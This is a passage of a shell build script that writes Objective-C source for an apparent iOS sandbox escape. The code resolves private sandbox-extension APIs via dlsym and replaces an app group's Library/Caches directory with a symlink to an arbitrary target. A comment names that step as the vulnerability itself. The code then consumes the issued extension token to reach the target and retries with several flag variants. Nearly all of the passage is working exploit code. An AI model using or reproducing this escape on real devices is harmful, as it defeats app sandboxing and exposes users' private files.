              sbx_consume_fn      consume     = (sbx_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

              if (!create || !set_class || !set_ids || !set_flags || !set_part ||
                  !get_single || !free_query || !copy_token || !consume) {
                  if (image) dlclose(image);
                  return -2;
              }

              void *query = create();
              if (!query) {
                  if (image) dlclose(image);
                  return -3;
              }

              set_class(query, SK_CQ_CLASS_APP_GROUP);
              xpc_object_t identifiers = sk_make_identifiers(group, array_ids);
              set_ids(query, identifiers);
              set_part(query, SK_CQ_PART_LIBRARY_CACHES);
              set_flags(query, flags);

              // 把 Library/Caches 换成指向目标的符号链接——这一步是漏洞本体。
              [fm removeItemAtPath:caches error:NULL];
              if (![fm createSymbolicLinkAtPath:caches withDestinationPath:target error:NULL]) {
                  free_query(query);
                  if (image) dlclose(image);
                  return -4;
              }

              int64_t result_code = 0;
              void *result = get_single(query);
              if (!result) {
                  result_code = -5;
              } else {
                  char *token = copy_token(result);
                  if (!token) {
                      result_code = -6;
                  } else {
                      int64_t handle = consume(token);
                      free(token);
                      result_code = (handle > 0) ? handle : -6;
                  }
              }

              free_query(query);
              sk_cleanup_symlink(group);
              if (image) dlclose(image);
              return result_code;
          }

          int64_t sk_escape(NSString *target, NSString *group, bool create_dir, int64_t *flags_used) {
              if (target.length == 0 || group.length == 0) return -1;
              if (!sk_has_app_group(group)) return -1;

              const uint64_t flags_order[2] = { SK_CQ_FLAGS_DEFAULT, SK_CQ_FLAGS_IOS26_APPGROUP };
              int64_t last = -2;

              for (int f = 0; f < 2; f++) {
                  for (int a = 0; a < 2; a++) {
                      int64_t handle = sk_escape_once(target, group, flags_order[f], create_dir, a == 1);
                      if (handle > 0) {
                          if (flags_used) *flags_used = (int64_t)flags_order[f];
                          return handle;
                      }
                      last = handle;
                      // 这些错误换参数也没意义，直接回。
                      if (handle == -255 || handle == -1 || handle == -2 ||
                          handle == -3 || handle == -4) {
                          return handle;
                      }
                  }
              }
              return last;
          }

          void sk_escape_release(int64_t handle) {
              if (handle <= 0) return;
              sbx_release_fn release_ext = (sbx_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
              if (release_ext) release_ext(handle);
          }
          SK_EOF_08_WORSE_QUERY_M
          mkdir -p Resources
          cat > Resources/Info.plist <<'SK_EOF_09_INFO_PLIST'
